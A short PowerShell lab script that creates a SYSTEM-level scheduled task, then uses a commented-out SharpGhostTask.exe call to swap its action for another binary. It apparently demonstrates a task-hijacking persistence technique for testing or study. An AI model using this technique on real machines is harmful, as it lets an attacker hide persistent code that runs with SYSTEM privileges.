# 01 - Create Schedule Task

$taskName = "Normal Task"
$trigger = New-ScheduledTaskTrigger -AtLogon
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c echo "Normal task msg" > C:\Users\Public\normal.txt'
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal

# 02 - Verify action of schedule task

(Get-ScheduledTask -TaskName "Normal Task" -Verbose | Select *).actions


# 03 - Run from command line runing on NT AUTHORITY\SYSTEM privileges

# .\SharpGhostTask.exe --targettask "Normal Task" --targetbinary "C:\Users\P4user\Documents\Dev Zone\sharp.bat"


# 04 - Verify action of schedule task

(Get-ScheduledTask -TaskName "Normal Task" -Verbose | Select *).actions